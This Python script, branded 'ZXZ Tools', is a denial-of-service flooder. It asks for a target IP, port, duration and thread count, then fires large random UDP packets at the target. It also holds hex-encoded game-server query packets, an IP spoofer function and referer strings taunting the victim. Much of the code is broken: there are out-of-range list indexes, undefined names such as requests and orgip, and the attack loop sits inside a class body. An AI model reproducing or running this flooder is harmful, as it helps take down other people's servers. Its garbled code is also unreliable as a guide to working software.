from time import time as tt
import threading
import socket
import random
import codecs
import os
import sys
import struct

pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

referers = [
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ,'
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ'
     'Your_Server_Bypassed_By_ZXZ'
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ',
     'Your_Server_Bypassed_By_ZXZ'
     'Your_Server_Bypassed_By_ZXZ']
     
from time import time as tt
import threading
import socket
import random
import codecs
import os
import sys

print("""                           
\033[35m         ╔═╗═╗\033[93m ╦╔═╗
\033[35m         ╔═╝╔╩╦\033[93m╝╔═╝
\033[35m         ╚═╝╩ ╚═╚\033[93m═╝
\033[95m       ☪  ZXZ Tools  ☪
""")
ip = str(input("\033[96m IP \033[35m:\033[91m "))
port = int(input("\033[96m Port \033[35m:\033[91m "))
time = int(input("\033[96m Times \033[35m:\033[91m "))
size = int(input("\033[96m Threads \033[35m:\033[91m "))

brand = """\033[95m
             ▄▄▄ ▄▄▄
            █████████  
             ▀█████▀
               ▀█▀

\033[93m            ZXZ Tools
"""

os.system("clear")
def spoofer():
    addr = [197, 255, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 256))
    addr[5] = str(random.randrange(2, 254))
    addr[6] = str(random.randrange(2, 256))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
    return assemebled

def getproxy():
    global proxies
    f = open(f'{nprox}.txt','wb')
    r = requests.get(urlproxy)
    f.write(r.content)
    f.close()
    proxies = open(f'{nprox}.txt').readlines()

class MyThread(threading.Thread):
	
    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    fmt = '\033[91mZXZ Attack To {ip}:{port}'.format(
        ip=ip,
        port='{port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)
    startup = tt()
    size = random._urandom(4150)
    pack = random._urandom(666)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))


if __name__ == '__main__':
    try:
        for x in range(500):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)
            
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)